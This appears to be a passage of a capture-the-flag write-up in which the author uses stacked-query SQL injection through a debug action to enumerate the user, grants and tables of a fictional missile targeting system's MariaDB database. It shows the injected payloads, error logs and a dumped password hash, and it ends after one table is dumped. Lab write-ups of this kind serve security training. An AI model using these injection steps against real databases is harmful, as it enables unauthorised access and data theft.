## Objective
Thwart Jack's evil plan by re-aiming his missile at the Sun.

## Solution

#### Enable the missile targetting system app and get the directory service URI

```
....
INFO: URI: maltcp://10.1.1.1:1025/missile-targeting-system-Directory
```
#### Connect to the Parameter Service


#### Injecting SQL Queries to find the correct injection point

```
;USER();
```

````
[ WARN] (ActionsExecutor-thread-2) Error: 1064-42000: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'USER()' at line 1
2023-12-28 16:17:33.951 esa.mo.nmf.apps.MissileTargetingSystemMCAdapter sqlDebug
WARNING: Debug action error: java.sql.SQLSyntaxErrorException: (conn=676) You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'USER()' at line 1
2023-12-28 16:17:33.957 esa.mo.nmf.apps.MissileTargetingSystemMCAdapter sqlDebug
WARNING: Debug action query: SELECT VERSION();USER();
````

```
;SELECT USER();
```
```
USER(): targeter@172.18.0.3 | 
```

#### Getting the rights on the tables
```
;SHOW GRANTS;
```
```
Grants for targeter@%: GRANT USAGE ON *.* TO `targeter`@`%` IDENTIFIED BY PASSWORD '*41E2CFE844C8F1F375D5704992440920F11A11BA' | 
Grants for targeter@%: GRANT SELECT, INSERT ON `missile_targeting_system`.`satellite_query` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`pointing_mode` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`messaging` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`target_coordinates` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`pointing_mode_to_str` TO `targeter`@`%` | 
```

#### Dumping tables data for juicy information
```
;SELECT * FROM pointing_mode_to_str;
```
```
id: 1 | numerical_mode: 0 | str_mode: Earth Point Mode | str_desc: When pointing_mode is 0, targeting system applies the target_coordinates to earth. | 
id: 2 | numerical_mode: 1 | str_mode: Sun Point Mode | str_desc: When pointing_mode is 1, targeting system points at the sun, ignoring the coordinates. | 
```
